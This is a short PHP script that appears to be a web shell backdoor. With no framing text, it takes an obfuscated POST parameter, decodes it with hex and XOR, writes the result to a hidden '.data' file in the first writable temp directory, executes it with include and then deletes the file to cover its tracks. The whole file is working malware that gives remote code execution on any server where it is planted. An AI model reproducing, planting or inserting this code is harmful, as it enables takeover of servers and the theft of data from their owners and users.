<?php

if(@$_POST["dch\x75n\x6B"] !== null){
	$hld = hex2bin($_POST["dch\x75n\x6B"]);
	$res    =   ''   ;   for($y=0; $y<strlen($hld); $y++){$res .= chr(ord($hld[$y]) ^ 96);}
	$object = array_filter([getcwd(), getenv("TEMP"), "/tmp", "/dev/shm", session_save_path(), "/var/tmp", ini_get("upload_tmp_dir"), sys_get_temp_dir(), getenv("TMP")]);
	for ($reference = 0, $ent = count($object); $reference < $ent; $reference++) {
    $ptr = $object[$reference];
    		if ((function($d) { return is_dir($d) && is_writable($d); })($ptr)) {
    $pset = implode("/", [$ptr, ".data"]);
    if (file_put_contents($pset, $res)) {
	include $pset;
	@unlink($pset);
	die();
}
}
}
}